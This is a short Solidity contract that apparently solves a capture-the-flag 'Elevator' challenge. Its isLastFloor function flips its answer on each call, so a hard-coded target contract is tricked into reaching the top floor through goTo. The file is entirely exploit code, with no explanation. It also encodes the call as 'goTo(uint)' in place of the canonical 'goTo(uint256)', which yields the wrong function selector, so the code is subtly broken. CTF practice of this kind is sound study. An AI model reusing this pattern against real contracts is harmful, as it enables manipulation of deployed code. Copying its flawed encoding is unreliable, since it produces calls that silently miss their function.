// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

contract Elevator {
    address target = 0x4AF0DE58faAdDac3a782142e365A1746283f220F;
    uint256 floor;
    bool top = true;

    function isLastFloor(uint _floor) external returns (bool) {
        floor = _floor;
        top = !top;
        return top;
    }

    function callGoto() public {
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature("goTo(uint)", 5));
        require(success, string(data));
    }
}